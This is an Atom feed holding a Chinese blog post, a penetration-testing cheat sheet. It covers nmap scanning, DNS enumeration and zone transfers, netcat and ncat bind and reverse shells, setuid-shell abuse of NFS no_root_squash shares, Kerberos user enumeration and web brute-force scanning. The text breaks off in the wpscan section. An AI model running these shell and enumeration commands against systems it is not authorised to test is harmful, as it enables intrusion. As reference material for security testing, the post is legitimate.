<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.marksec.org/"/>
  <updated>2019-05-08T12:19:42.550Z</updated>
  <id>https://www.marksec.org/</id>
  
  <author>
    <name>mark</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pentesting备忘录（内容补充版）</title>
    <link href="https://www.marksec.org/2019/05/07/Pentesting%20%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>https://www.marksec.org/2019/05/07/Pentesting 备忘录/</id>
    <published>2019-05-07T10:13:00.000Z</published>
    <updated>2019-05-08T12:19:42.550Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote><br>  在先知上看见wing发的Pentesting备忘录，发现了好多比较好的命令和在实战中比较有用的命令，在看完后自己结合原版和中文版添加了一些拓展，让自己在回看的时候快速的回顾内容。同时发现原文的其他内容比较不错，后续也会跟随翻译一点。<br></blockquote><br><a id="more"></a></p><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><h3 id="NMAP实用命令"><a href="#NMAP实用命令" class="headerlink" title="NMAP实用命令"></a>NMAP实用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">快速扫描</span><br><span class="line">nmap -T4 -F 192.168.169.105</span><br><span class="line">SYN迅速扫描：（TCP两次握手，隐蔽性高）</span><br><span class="line">nmap -sS -T4 -A -v cnblogs.com</span><br><span class="line">UDP迅速扫描</span><br><span class="line">nmap -sU -v 192.168.169.105</span><br><span class="line">迅速扫描（NoPing）</span><br><span class="line">nmap -T4 -A -v -Pn 192.168.169.105</span><br><span class="line">快速扫描加强</span><br><span class="line">nmap -sV -T4 -O -F --version-light 192.168.169.105</span><br></pre></td></tr></table></figure><h3 id="从Nmap-Scan中提取实时IP"><a href="#从Nmap-Scan中提取实时IP" class="headerlink" title="从Nmap Scan中提取实时IP"></a>从Nmap Scan中提取实时IP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips</span><br></pre></td></tr></table></figure><h3 id="简单的端口扫描"><a href="#简单的端口扫描" class="headerlink" title="简单的端口扫描"></a>简单的端口扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done</span><br></pre></td></tr></table></figure><h2 id="DNS-lookups-Zone-Transfers-amp-Brute-Force"><a href="#DNS-lookups-Zone-Transfers-amp-Brute-Force" class="headerlink" title="DNS lookups, Zone Transfers &amp; Brute-Force"></a>DNS lookups, Zone Transfers &amp; Brute-Force</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whois domain.com //whois 查询</span><br><span class="line">dig &#123;a|txt|ns|mx&#125; domain.com  //查询域名A记录，txt记录，域名解析记录，邮件记录</span><br><span class="line">dig &#123;a|txt|ns|mx&#125; domain.com @ns1.domain.com</span><br><span class="line">host -t &#123;a|txt|ns|mx&#125; megacorpone.com</span><br><span class="line">host -a megacorpone.com</span><br><span class="line">host -l megacorpone.com ns1.megacorpone.com</span><br><span class="line">dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com</span><br><span class="line">dnsenum domain.com</span><br><span class="line">nslookup -&gt; set type=any -&gt; ls -d domain.com</span><br><span class="line">for sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done</span><br></pre></td></tr></table></figure><h3 id="DIG用法简析"><a href="#DIG用法简析" class="headerlink" title="DIG用法简析"></a>DIG用法简析</h3><p>Dig（Domain Information Groper）是一个在类Unix命令行模式下查询DNS包括NS记录，A记录，MX记录等相关信息的工具。</p><h4 id="DNS-命令输出格式"><a href="#DNS-命令输出格式" class="headerlink" title="DNS 命令输出格式"></a>DNS 命令输出格式</h4><p>输入 dig <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 命令，通常返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dig www.baidu.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-3-Debian &lt;&lt;&gt;&gt; www.baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 19917  //status: NOERROR 表示查询没有什么错误</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 512</span><br><span class="line">;; QUESTION SECTION:  // 表示需要查询的内容，这里需要查询域名的 A 记录</span><br><span class="line">;www.baidu.com.INA</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION://ANSWER SECTION 表示查询结果，返回 A 记录的 IP 地址</span><br><span class="line">www.baidu.com.668INCNAMEwww.a.shifen.com.//668 表示本次查询缓存时间</span><br><span class="line">www.a.shifen.com.33INA61.135.169.121   //权威 DNS 服务器</span><br><span class="line">www.a.shifen.com.33INA61.135.169.125</span><br><span class="line"></span><br><span class="line">;; Query time: 20 msec //Query time 表示查询完成时间</span><br><span class="line">;; SERVER: 192.168.2.1#53(192.168.2.1) //表示本地 DNS 服务器地址和端口号</span><br><span class="line">;; WHEN: Thu Apr 18 03:57:33 EDT 2019</span><br><span class="line">;; MSG SIZE  rcvd: 101</span><br></pre></td></tr></table></figure><h4 id="DNS-服务器记录类型"><a href="#DNS-服务器记录类型" class="headerlink" title="DNS 服务器记录类型"></a>DNS 服务器记录类型</h4><p>默认 dig rss.newyingyong.cn 返回的是 A 记录类型，其他类型还包括 MX、NS、SOA 等</p><p>（1）dig -t a <a href="http://www.weibo.com" target="_blank" rel="noopener">www.weibo.com</a> +noall +answer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dig -t a www.weibo.com +noall +answer</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-3-Debian &lt;&lt;&gt;&gt; -t a www.weibo.com +noall +answer</span><br><span class="line">;; global options: +cmd</span><br><span class="line">www.weibo.com.60INA123.125.104.26</span><br><span class="line">www.weibo.com.60INA123.125.104.197</span><br><span class="line"></span><br><span class="line">其中 +noall +answer 表示返回简短信息，这里表示查询 A 记录。</span><br><span class="line">注意，这里返回 2 个 A 记录，这相当于 DNS 均衡，比如浏览器客户端查询 www.weibo.com 域名得到两个 A 记录，然后连接其中的一个 IP 地址对应的 WEB 服务器，假如发现连接不上，可以使用另外一个地址连接。</span><br><span class="line">比如在万网域名管理后台，可以给同一个域名添加两条 A 记录，相当于实现了域名负载均衡。</span><br></pre></td></tr></table></figure><p>（2）dig -t ns weibo.com</p><p>注意假如用户输入 dig -t ns <a href="http://www.weibo.com" target="_blank" rel="noopener">www.weibo.com</a> 是查询不出 NS 任何记录的，原因在于只有一级域名（或者顶级域名）才有 NS 记录，通过 FQDN 是查询不出 NS 信息的，所以要输入 dig -t ns weibo.com ，返回：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dig -t ns weibo.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-3-Debian &lt;&lt;&gt;&gt; -t ns weibo.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 25391</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 512</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;weibo.com.INNS</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">weibo.com.833INNSns3.sina.com.cn.</span><br><span class="line">weibo.com.833INNSns4.sina.com.cn.</span><br><span class="line">weibo.com.833INNSns4.sina.com.</span><br><span class="line">weibo.com.833INNSns2.sina.com.cn.</span><br><span class="line">weibo.com.833INNSns1.sina.com.cn.</span><br><span class="line">weibo.com.833INNSns3.sina.com.</span><br><span class="line"></span><br><span class="line">;; Query time: 24 msec</span><br><span class="line">;; SERVER: 192.168.2.1#53(192.168.2.1)</span><br><span class="line">;; WHEN: Thu Apr 18 04:18:26 EDT 2019</span><br><span class="line">;; MSG SIZE  rcvd: 162</span><br><span class="line"></span><br><span class="line">微博的权威服务器是微博自己建立的，有 6 个名称和 IP 地址：</span><br><span class="line"></span><br><span class="line">有这么多地址，主要是防止单点问题，比如某个 NS 服务器连接不上，可以连接其他 NS 服务器</span><br><span class="line">上述的 NS IP 地址属于不同的运营商，不同的运营商可能会查询对应的 NS 服务器，原因就是加速查询。</span><br></pre></td></tr></table></figure><p>（3）dig -t a <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com.293INCNAMEwww.a.shifen.com.</span><br><span class="line">www.a.shifen.com.281INCNAMEwww.wshifen.com.</span><br><span class="line">www.wshifen.com.225INA103.235.46.39</span><br><span class="line">这里返回的 CNAME 表示查询 www.baidu.com 的信息其实是 www.a.shifen.com 返回的 A 记录。</span><br></pre></td></tr></table></figure><p>（4）dig -t mx baidu.com</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dig -t mx baidu.com</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;baidu.com.INMX</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">baidu.com.1100INMX10 mx.maillb.baidu.com.</span><br><span class="line">baidu.com.1100INMX15 mx.n.shifen.com.</span><br><span class="line">baidu.com.1100INMX20 mx1.baidu.com.</span><br><span class="line">baidu.com.1100INMX20 mx50.baidu.com.</span><br><span class="line">baidu.com.1100INMX20 jpmx.baidu.com.</span><br><span class="line"></span><br><span class="line">返回 MX 记录，注意这里不能输入 dig -t mx www.baidu.com ，因为 MX 记录一般配置在一级域名下。</span><br></pre></td></tr></table></figure><h4 id="DNS-迭代查询的具体流程"><a href="#DNS-迭代查询的具体流程" class="headerlink" title="DNS 迭代查询的具体流程"></a>DNS 迭代查询的具体流程</h4><p>对于客户端（比如浏览器）查询本地域名 DNS 信息的时候，是递归查询的方式。而本地 DNS 服务器为了获取到某个域名的 DNS 信息，会使用迭代的方式（一步步询问）。通过 dig +trace blog.newyingyong.cn 来进行了解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dig +trace www.marksec.org</span><br><span class="line">;; Warning: Message parser reports malformed message packet.</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.4-P2-3-Debian &lt;&lt;&gt;&gt; +trace www.marksec.org</span><br><span class="line">;; global options: +cmd</span><br><span class="line">.243694INNSa.root-servers.net.</span><br><span class="line">.243694INNSb.root-servers.net.</span><br><span class="line">.243694INNSc.root-servers.net.</span><br><span class="line">.243694INNSd.root-servers.net.</span><br><span class="line">.243694INNSe.root-servers.net.</span><br><span class="line">.243694INNSf.root-servers.net.</span><br><span class="line">.243694INNSg.root-servers.net.</span><br><span class="line">.243694INNSh.root-servers.net.</span><br><span class="line">.243694INNSi.root-servers.net.</span><br><span class="line">.243694INNSj.root-servers.net.</span><br><span class="line">.243694INNSk.root-servers.net.</span><br><span class="line">.243694INNSl.root-servers.net.</span><br><span class="line">.243694INNSm.root-servers.net.</span><br><span class="line">;; Received 512 bytes from 192.168.2.1#53(192.168.2.1) in 55 ms//本地服务器查询</span><br><span class="line"></span><br><span class="line">org.172800INNSd0.org.afilias-nst.org.</span><br><span class="line">org.172800INNSb0.org.afilias-nst.org.</span><br><span class="line">org.172800INNSb2.org.afilias-nst.org.</span><br><span class="line">org.172800INNSa0.org.afilias-nst.info.</span><br><span class="line">org.172800INNSc0.org.afilias-nst.info.</span><br><span class="line">org.172800INNSa2.org.afilias-nst.info.</span><br><span class="line">org.86400INDS9795 7 1 364DFAB3DAF254CAB477B5675B10766DDAA24982</span><br><span class="line">org.86400INDS9795 7 2 3922B31B6F3A4EA92B19EB7B52120F031FD8E05FF0B03BAFCF9F891B FE7FF8E5</span><br><span class="line">org.86400INRRSIGDS 8 1 86400 20190501050000 20190418040000 25266 </span><br><span class="line">;; Received 817 bytes from 192.36.148.17#53(i.root-servers.net) in 58 ms//cn服务器查询</span><br><span class="line"></span><br><span class="line">marksec.org.86400INNSdns10.hichina.com.</span><br><span class="line">marksec.org.86400INNSdns9.hichina.com.</span><br><span class="line">h9p7u7tr2u91d0v0ljs9l1gidnp90u3h.org. 86400 IN NSEC3 1 1 1 D399EAAB H9PARR669T6U8O1GSG9E1LMITK4DEM0T NS SOA RRSIG DNSKEY NSEC3PARAM</span><br><span class="line">h9p7u7tr2u91d0v0ljs9l1gidnp90u3h.org. 86400 IN RRSIG NSEC3 7 2 86400 20190509082640 20190418072640 </span><br><span class="line">kj8622o9iq7ec42rj4grq506j1qagjkq.org. 86400 IN NSEC3 1 1 1 D399EAAB KJ8FDV3C6J6J757NJ1F1PP9C9IDUH76A NS DS RRSIG</span><br><span class="line">kj8622o9iq7ec42rj4grq506j1qagjkq.org. 86400 IN RRSIG NSEC3 7 2 86400 20190508152516 20190417142516 </span><br><span class="line"></span><br><span class="line">;; Received 587 bytes from 199.19.57.1#53(d0.org.afilias-nst.org) in 113 ms //github服务器查询</span><br><span class="line"></span><br><span class="line">www.marksec.org.600INCNAMEmarkhacker.github.io.</span><br><span class="line">;; Received 78 bytes from 106.11.211.56#53(dns10.hichina.com) in 11 ms</span><br></pre></td></tr></table></figure><h4 id="DNS-缓存"><a href="#DNS-缓存" class="headerlink" title="DNS 缓存"></a>DNS 缓存</h4><p>假如 DNS 服务器每次都需要迭代或递归查询上一级的 DNS 服务器，那么 DNS 可能就不堪重负，考虑到域名的 DNS 信息不会频繁的修改，所以每一级中的 DNS 服务器都会缓存结果（包括浏览器这样的客户端也会缓存 DNS 结果）。<br>缓存带来的弊端可能就是 DNS 信息可能不是最新的，比如某个域名管理员修改了某个域名的 A 记录，由于每一级的 DNS 服务器都有缓存，所以最后客户端拿到的结果不是最新的，为了获取到最新的结果，可以直接向权威域名服务器进行信息查询。<br>比如 blog.rss.newyingyong.cn 的域名是由 dns9.hichina.com.（106.11.211.55）管理的，可以直接通过 dig @106.11.211.55  -t a baidu.com 或者  dig @dns9.hichina.com -t a baidu.com 获取最新 A 记录。<br>另外你也可以不查询本地 DNS 服务器获取信息，比如可以使用 8.8.8.8 Google Public DNS 进行查询，dig @8.8.8.8 -t a baidu.com 。</p><p>参考链接：<a href="https://www.jianshu.com/p/71f61652ec23" target="_blank" rel="noopener">https://www.jianshu.com/p/71f61652ec23</a></p><h2 id="Banner抓取"><a href="#Banner抓取" class="headerlink" title="Banner抓取"></a>Banner抓取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -v $TARGET 80</span><br><span class="line">telnet $TARGET 80</span><br><span class="line">curl -vX $TARGET</span><br></pre></td></tr></table></figure><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>netcat是一个优秀的网络工具，在业界有“瑞士军刀”的美誉，通常在Linux系统下都自带了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">测试环境</span><br><span class="line">Kali 192.168.2.10</span><br><span class="line">Windows 192.168.2.12</span><br><span class="line"></span><br><span class="line">聊天</span><br><span class="line">Windows nc -nlvp 4444</span><br><span class="line">Kali nc -nv 192.168.2.12 4444</span><br><span class="line"></span><br><span class="line">正向shell</span><br><span class="line">Windows nc -nlvp 4444 -e cmd.exe</span><br><span class="line">Kali nc -nv 192.168.2.12 4444</span><br><span class="line"></span><br><span class="line">反向shell</span><br><span class="line">Windows nc -nlvp 4444</span><br><span class="line">Kali nc -nv 192.168.2.12 4444 -e /bin/bash</span><br><span class="line"></span><br><span class="line">文件传输</span><br><span class="line">Windows nc -nlvp 4444 &gt; incoming.exe</span><br><span class="line">Kali nc -nv 192.168.2.12 &lt; /usr/share/windows-binnaries/wget.exe</span><br></pre></td></tr></table></figure><h3 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h3><p>Ncat是nmap工具集的一部分，使用如下命令使用Ncat生成一个正向shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows ncat -nlvp 4444 -e cmd.exe --allow 192.168.2.10 --ssl</span><br><span class="line">Linux ncat -nv 192.168.2.12 4444 --ssl</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://bbs.pediy.com/thread-222364.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222364.htm</a></p><h3 id="NFS共享"><a href="#NFS共享" class="headerlink" title="NFS共享"></a>NFS共享</h3><p>列出NFS导出的共享文件，如果RW和no_root_squash存在，那就直接上传Sid-Shell执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.110.102</span><br><span class="line">chown root:root sid-shell; chmod +s sid-shell</span><br></pre></td></tr></table></figure><h2 id="Kerberos域用户名枚举"><a href="#Kerberos域用户名枚举" class="headerlink" title="Kerberos域用户名枚举"></a>Kerberos域用户名枚举</h2><p>kerberos主要是用来做网络通信时候的身份认证，在域里可以利用Kerberos响应来识别有效或无效的域帐户。目前使用的工具第一种是独立的Java工具Krbguess，第二种是用于nmap的krb5-enum-users NSE脚本。</p><h3 id="Krbguess"><a href="#Krbguess" class="headerlink" title="Krbguess"></a>Krbguess</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line">Java -jar kerbguess.jar -r [domain] -d [用户列表] -s [DC IP ]</span><br></pre></td></tr></table></figure><p><img src="\images\Pentesting\krbguess .jpg" alt></p><h3 id="Nmap-krb5-enum-users-NSE脚本"><a href="#Nmap-krb5-enum-users-NSE脚本" class="headerlink" title="Nmap krb5-enum-users NSE脚本"></a>Nmap krb5-enum-users NSE脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line">Nmap -p 88 -script-args krb5-enum-users.realm =&apos;[domain]&apos;，userdb = [user list] [DC IP]</span><br></pre></td></tr></table></figure><p>![]\images\Pentesting\nmap_kerberos_enum-1.jpg)</p><h3 id="Metasploit模块"><a href="#Metasploit模块" class="headerlink" title="Metasploit模块"></a>Metasploit模块</h3><p>auxiliary/gather/kerberos_enumusers</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/gather/kerberos_enumusers</span><br><span class="line">msf5 auxiliary(gather/kerberos_enumusers) &gt; options </span><br><span class="line">Module options (auxiliary/gather/kerberos_enumusers):</span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   DOMAIN                      yes       The Domain Eg: demo.local</span><br><span class="line">   RHOSTS                      yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT      88               yes       The target port</span><br><span class="line">   Timeout    10               yes       The TCP timeout to establish connection and read data</span><br><span class="line">   USER_FILE                   yes       Files containing usernames, one per line</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(gather/kerberos_enumusers) &gt; set domain mydoamin</span><br><span class="line">domain =&gt; mydoamin</span><br><span class="line">msf5 auxiliary(gather/kerberos_enumusers) &gt; set rhosts 192.168.1.1</span><br><span class="line">rhosts =&gt; 192.168.1.1</span><br><span class="line">msf5 auxiliary(gather/kerberos_enumusers) &gt; set user_file /job/users.txt</span><br><span class="line">user_file =&gt; /job/users.txt</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.attackdebris.com/?p=311" target="_blank" rel="noopener">https://www.attackdebris.com/?p=311</a></p><h2 id="HTTP-Brute-Force-amp-Vulnerability-Scanning"><a href="#HTTP-Brute-Force-amp-Vulnerability-Scanning" class="headerlink" title="HTTP Brute-Force &amp; Vulnerability Scanning"></a>HTTP Brute-Force &amp; Vulnerability Scanning</h2><p>暴力和漏洞扫描常用工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster</span><br><span class="line">target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto</span><br><span class="line">target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum</span><br><span class="line"></span><br><span class="line">tee命令用于将数据重定向到文件，另一方面还可以提供一份重定向数据的副本作为后续命令的stdin。简单的说就是把数据重定向到给定文件和屏幕上。</span><br></pre></td></tr></table></figure><h3 id="gohuster"><a href="#gohuster" class="headerlink" title="gohuster"></a>gohuster</h3><p>Linux默认安装的一款暴力扫描工具。它是使用Go语言编写的命令行工具，具备优异的执行效率和并发性能。该工具支持对子域名和Web目录进行基于字典的暴力扫描。不同于其他工具，该工具支持同时多扩展名破解，适合采用多种后台技术的网站。实施子域名扫描时，该工具支持泛域名扫描，并允许用户强制继续扫描，以应对泛域名解析带来的影响。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-P string：基本AUTH的密码（仅为DIR模式）</span><br><span class="line">-U string：基本AUTH的用户名（仅为DIR模式）</span><br><span class="line">-a string：设置用户代理字符串（DIR模式）</span><br><span class="line">-c string：用于请求的Cookie（仅为DIR模式）</span><br><span class="line">-cn：显示CNNEX记录（DNS模式），不能与“-I”选项一起使用）</span><br><span class="line">-e：扩展模式，打印完整URL</span><br><span class="line">-f：向每个目录请求追加前斜线（仅为DIR模式）</span><br><span class="line">-fw：当通配符发现时，强制继续操作</span><br><span class="line">-i：显示IP地址（仅DNS模式）</span><br><span class="line">-k：跳过SSL证书验证</span><br><span class="line">-l：包括在输出中的主体长度（仅为DIR模式）</span><br><span class="line">-m string：目录/文件模式（DIR）或DNS模式（DNS）（默认“DIR”）</span><br><span class="line">-n：不要打印状态代码</span><br><span class="line">-np：不显示进度</span><br><span class="line">-o string：输出文件以写入结果（默认为STDUT）</span><br><span class="line">-p string：用于请求的代理[http(s)://主机:端口]（仅dir模式）</span><br><span class="line">-q：不要打印横幅和其他噪音</span><br><span class="line">-r：追随重定向</span><br><span class="line">-s string：设置状态码（DIR模式）（默认&quot;200,204,301,302,307,403&quot;）</span><br><span class="line">-t int：并发线程数（默认值10）</span><br><span class="line">-to duration：HTTP超时（仅限于DIR模式）（默认10s）</span><br><span class="line">-u string：目标URL或域</span><br><span class="line">-v：冗长输出（错误）</span><br><span class="line">-w string：暴力猜解的单词列表的路径</span><br><span class="line">-x string：要搜索的文件扩展（仅限于DIR模式）</span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster -u &lt;http://www.xxx.cn/&gt; -t 20 -w /root/扫描目录.txt -s 200,301,302,401,403</span><br><span class="line">-x html,htm,asp</span><br></pre></td></tr></table></figure><h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p>options</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 